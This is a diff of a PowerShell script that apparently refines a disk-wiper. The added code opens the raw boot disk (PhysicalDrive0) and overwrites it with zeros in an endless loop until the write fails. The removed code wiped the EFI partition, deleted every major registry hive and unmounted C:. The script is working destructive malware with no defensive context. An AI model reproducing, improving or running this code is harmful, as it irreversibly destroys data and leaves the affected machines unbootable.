@@ -76,29 +76,19 @@ $timer.Stop()
 $g.Dispose()
 $bitmap.Dispose()
 $disk = "\\.\PhysicalDrive0"
-$size = 1840960000
-$bytes = New-Object byte[]($size)
+$chunkSize = 4MB
+$chunk = New-Object byte[]($chunkSize)
+$totalWritten = 0
+
 try {
     $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
-    $stream.Position = 0
-    $stream.Write($bytes, 0, $size)
+    while ($true) {
+        $stream.Write($chunk, 0, $chunkSize)
+        $totalWritten += $chunkSize
+        Write-Host "Written: $([math]::Round($totalWritten/1GB, 2)) GB"
+    }
 } catch {
-    Write-Host "Error write: $_"
+    Write-Host "Stopped at $([math]::Round($totalWritten/1GB, 2)) GB — $_"
 } finally {
     if ($stream) { $stream.Close() }
 }
-
-# Mount EFI partition
-if (!(mountvol S: /s)) {
-    Write-Host "Mountvol error"
-    exit
-}
-
-# Cleanup
-cmd /c "del /f /s /q S:*.* > NUL 2>&1"
-@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
-    cmd /c "reg delete $_ /f"
-}
-
-Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
-mountvol C: /d
